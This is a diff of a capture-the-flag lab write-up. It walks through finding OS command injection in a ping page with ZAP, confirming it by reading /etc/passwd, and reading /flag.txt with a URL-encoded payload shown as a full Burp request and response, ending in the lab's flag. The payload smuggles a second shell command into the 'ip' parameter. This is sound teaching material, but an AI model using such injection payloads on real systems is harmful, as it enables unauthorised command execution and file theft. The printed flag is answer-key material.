@@ -80,7 +80,7 @@ Solution:
 2) start scan in "Attack mode" > let the Active scan, spider crawl , etc finish
 3) go to "Alerts" to check vulnerabilities found after scan
 4) Two high level vulnerabilities found "Remote OS Command Injection" ,  "SQL Injection"/"SQL Injection - Oracle - Time Based"
-5) take the "Remote OS Command Injection"   and review its request payload :
+5) take the "Remote OS Command Injection"   and review its request payload : in Burp repeater
 ```
 "Remote OS Command Injection" 
 
@@ -100,6 +100,48 @@ Priority: u=0, i
 as show in SS this request executes on target server and returns /etc/passwd  contents in response, therefore we confirm Remote OS Command Injection is there .
 
 
-Now , create this payload: GET /devtools/ping.php?ip=127.0.0.1&cat /flag.txt& , to solve the Question "try to use it to read the flag at '/flag.txt"
+Now , create this payload: GET /devtools/ping.php?ip=127.0.0.1&cat /flag.txt& , to solve the Question "try to use it to read the flag at '/flag.txt".
+Url encode the payload as well :- in burp repeater
+```
+GET /devtools/ping.php?ip=127.0.0.1%26cat+/flag.txt%26 HTTP/1.1
+Host: 94.237.61.133:39523
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 
-Url encode the payload as well
+
+```
+
+response for our above request is
+```
+HTTP/1.1 200 OK
+Date: Fri, 04 Apr 2025 06:52:32 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 156
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Ping</title>
+</head>
+
+<body>
+  HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
+</body>
+
+</html>
+```
+
+Hence we found the flag for this lab : ==HTB{5c4nn3r5_f1nd_vuln5_w3_m155}==
+submit it and lab is solved
